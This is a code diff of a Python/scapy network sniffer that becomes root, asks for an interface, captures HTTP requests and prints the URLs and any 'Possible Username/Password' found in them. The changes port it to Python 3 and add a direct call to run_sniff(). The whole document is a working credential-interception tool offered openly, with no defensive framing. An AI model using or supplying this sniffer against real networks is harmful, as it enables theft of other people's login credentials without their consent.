@@ -1,7 +1,7 @@
 import scapy.all as scapy
 import os
 import sys
-from scapy.layers import http
+from scapy_http import http
 import netifaces
 
 def become_root():
@@ -34,22 +34,24 @@ def get_login(packet):
 
 def processed_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        url = geturl(packet)
-        print("[+] HTTP Requests -->" + url.decode())
-        login_info = get_login(packet)
+        url = str(geturl(packet))
+        print("[+] HTTP Requests -->" + url)
+        login_info = str(get_login(packet))
         if login_info:
-            print("\n\n[+] Possible Username/Password -->" + login_info.decode() + "\n\n")
+            print("\n\n[+] Possible Username/Password -->" + login_info + "\n\n")
 
 
 def run_sniff():
     become_root()
     interfaces = netifaces.interfaces()
-    print("Availabe Interfaces :")
+    print("Available Interfaces :")
     print(interfaces)
-    interface = raw_input("Enter the interface ")
+    interface = input("Enter the interface ")
     if interface not in interfaces:
         print("Pleas Enter a valid Interface!!")
     else:
         print("Sniffing.........")
         sniff(interface)
 
+
+run_sniff()
